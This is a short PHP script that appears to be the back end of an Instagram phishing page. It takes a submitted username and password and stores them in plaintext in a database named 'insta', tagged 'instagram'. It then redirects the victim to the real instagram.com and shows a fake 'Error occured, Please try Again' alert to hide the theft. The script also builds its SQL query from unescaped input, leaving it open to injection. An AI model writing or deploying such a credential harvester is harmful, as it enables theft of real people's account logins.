<?php
$db=mysqli_connect('localhost','root','','insta');
if(!$db){
	echo "Database connection Error" .mysqli_connect_error();
}

if(isset($_POST['submit'])){

$username=$_POST['username'];
$password=$_POST['password'];

if(!empty($username) AND !empty($password)){
	$query="INSERT INTO users(username,password,Do,logs)
VALUES('$username','$password','instagram',now())";
if(mysqli_query($db,$query)){
	
	echo "<meta http-equiv='refresh' content='0;URL=https://www.instagram.com/'/>";
	echo"<script>alert('Error occured,Please try Again.)</script>";
}else{
	echo "Error occured". mysqli_error();
}

}




} 

 ?>